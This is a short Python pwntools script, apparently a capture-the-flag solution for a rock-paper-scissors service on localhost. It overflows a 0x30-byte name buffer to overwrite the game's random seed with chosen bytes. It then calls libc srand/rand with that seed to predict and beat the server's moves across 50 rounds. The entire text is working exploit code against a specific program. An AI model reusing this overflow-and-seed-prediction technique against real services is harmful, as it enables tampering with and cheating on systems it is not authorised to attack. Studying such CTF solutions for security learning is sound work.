from pwn import *
from ctypes import *

def getNextAnswer():
    rps = 'RPS'
    return rps[((libc.rand()%3)+1)%3] # +1 because PRS beats RPS

seed = "\xfc\xfd\xfe\xff"
H,P='localhost',6666
libc = CDLL('libc.so.6')
libc.srand(0xfffefdfc)
r = remote(H,P)
username = "A"*0x30+seed
junk=r.recvuntil("What's your name: ")
r.sendline(username)
for i in range(50):
    junk+=r.recvuntil('Rock? Paper? Scissors? [RPS]')
    x = getNextAnswer()
    r.sendline(x)
junk+=r.recvall()
print junk
